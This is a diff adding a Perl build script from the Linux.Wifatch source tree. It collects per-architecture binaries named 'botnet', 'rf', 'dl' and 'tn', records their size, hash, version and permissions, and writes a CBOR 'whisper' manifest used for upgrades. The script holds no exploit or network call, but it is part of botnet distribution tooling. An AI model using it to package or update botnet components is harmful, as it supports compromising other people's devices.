@@ -1,0 +1,67 @@
+#!/usr/bin/env perl
+#
+# This file is part of Linux.Wifatch
+#
+# Copyright (c) 2013,2014,2015 The White Team <rav7teif@ya.ru>
+#
+# Linux.Wifatch is free software: you can redistribute it and/or modify
+# it under the terms of the GNU General Public License as published by
+# the Free Software Foundation, either version 3 of the License, or
+# (at your option) any later version.
+#
+# Linux.Wifatch is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License
+# along with Linux.Wifatch. If not, see <http://www.gnu.org/licenses/>.
+#
+
+# originally build "!whisper" data, for upgrades
+# now only builds the whisper file for xx5
+
+use strict;
+use Digest::SHA;
+use CBOR::XS;
+use Compress::LZF;
+
+use bm::file;
+
+my $version = shift;
+my $arch    = shift;
+
+my %whisper;
+
+sub add
+{
+	my ($name, $path) = @_;
+
+	#	warn "add $name ($path)\n";
+
+	my $file = bm::file::load $path;
+	$whisper{file}{$name} = [length $file->{data}, $file->{sha}, $file->{version}, $file->{perm}];
+}
+
+add pl => "dist/pl";
+
+for (   [bn => "botnet"],
+
+	#	[zm       => "zmap"],
+	#	[dbclient => "dc"],
+	[rf => "rf"],
+	[dl => "dl"],
+	[tn => "tn"],
+	) {
+	my ($bn, $botnet) = @$_;
+
+	for my $path (<arch/*/$botnet>) {
+		my $name = $path;
+		$name =~ s%/\Q$botnet%/$bn%;
+		$name =~ s%^arch/%%;
+		add $name => $path;
+	}
+}
+
+syswrite STDOUT, encode_cbor \%whisper;
+
